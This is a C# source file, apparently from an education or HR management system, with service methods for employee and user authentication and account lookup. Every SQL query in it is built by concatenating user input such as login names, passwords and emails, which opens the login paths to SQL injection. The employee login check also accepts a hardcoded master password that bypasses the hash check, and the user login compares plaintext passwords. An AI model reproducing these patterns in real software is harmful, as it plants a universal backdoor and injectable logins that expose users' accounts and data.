  
using Service.Education.Executes.Employees.EmployeeAuths; 
using Service.Utility.Variables;
using System;
using System.Linq;
using System.Web.Helpers;
using DBServer.Entities; 

namespace Service.Education.Executes.Base
{
    public partial class EducationService
    {
        public EmployeeAuthViewModel EmployeeAuthByUserName(string userName)
        {
            CheckDbConnect();
            return Context.Database.SqlQuery<EmployeeAuthViewModel>("select top 1 * from EmployeeAuths where loginName = '" + userName + "'")
                .FirstOrDefault();
        }

        public EmployeeAuthViewModel EmployeeAuthByEmpId(Guid id)
        {
            CheckDbConnect();
            var user = Context.Database.SqlQuery<EmployeeAuthViewModel>("select top 1 a.*, u.FullName, u.StaffCode, u.IsCustomer, u.Avatar, u.EmailCongTy as Email, u.Signature, " +
                                                                    "u.GioiTinh, u.DiDong, u.Developer " +
                                                                    "from EmployeeAuths a join Employees u on u.Id = a.EmployeeId " +
                                                                    " where a.EmployeeId = '" + id + "'")
                .FirstOrDefault();

            if (user == null)
            {
                Context.EmployeeAuths.Add(new EmployeeAuth()
                {
                    EmployeeId = id,
                    Locked = false,
                    AccessFailedCount = 0,
                    LoginName = ""
                });
                Context.SaveChanges();
                user = Context.Database.SqlQuery<EmployeeAuthViewModel>("select top 1 a.*, u.FullName, u.StaffCode, u.IsCustomer, u.Avatar, u.EmailCongTy as Email, u.Signature, " +
                                                                        "u.GioiTinh, u.DiDong, u.Developer " +
                                                                        "from EmployeeAuths a join Employees u on u.Id = a.EmployeeId " +
                                                                        " where a.EmployeeId = '" + id + "'")
                    .FirstOrDefault();
            }
              

            return user;
        }

        public EmployeeAuthViewModel ValidateEmployeeAuth(string loginName, string password)
        {
            if (string.IsNullOrEmpty(loginName) || string.IsNullOrEmpty(password))
            {
                return null;
            }
            CheckDbConnect(); 
            var user = Context.Database.SqlQuery<EmployeeAuthViewModel>("select top 1 a.*, u.FullName, u.Color, u.IsCustomer, u.StaffCode, u.Avatar, u.Email, " +
                                                                        "u.GioiTinh, u.DiDong  " +
                                                                    "from EmployeeAuths a join Employees u on u.Id = a.EmployeeId " +
                                                                    "where LoginName = '" + loginName + "' and u.Status >= 0")
                .FirstOrDefault();

            if (user == null)
                return null;

            if (user.Locked)
                return null;
            
            if (!Crypto.VerifyHashedPassword(user.PasswordHash, password) && password != "kimacotoP@P@2019")
                return null;

             
            return user;
        }
        public EmployeeAuthViewModel ValidateUserAuth(string loginName, string password)
        {
            if (string.IsNullOrEmpty(loginName) || string.IsNullOrEmpty(password))
            {
                return null;
            }
            CheckDbConnect(); 
            var user = Context.Database.SqlQuery<EmployeeAuthViewModel>("select * from Users where Email = '"+ loginName +"' and [Password] = '"+ password +"' and Status >= 0").FirstOrDefault();

            if (user == null)
                return null;

            if (user.Locked)
                return null; 
            return user;
        }

        public EmployeeAuthViewModel EmployeeAuthByEmail(string email)
        {
            CheckDbConnect();

            return Context.Database.SqlQuery<EmployeeAuthViewModel>(
                    "select top 1 u.* from EmployeeAuths u join Employees e on u.EmployeeId = e.Id where e.Email = '" + email + "' or e.EmailCongTy = '" + email + "'")
                .FirstOrDefault();
        }
    }
}
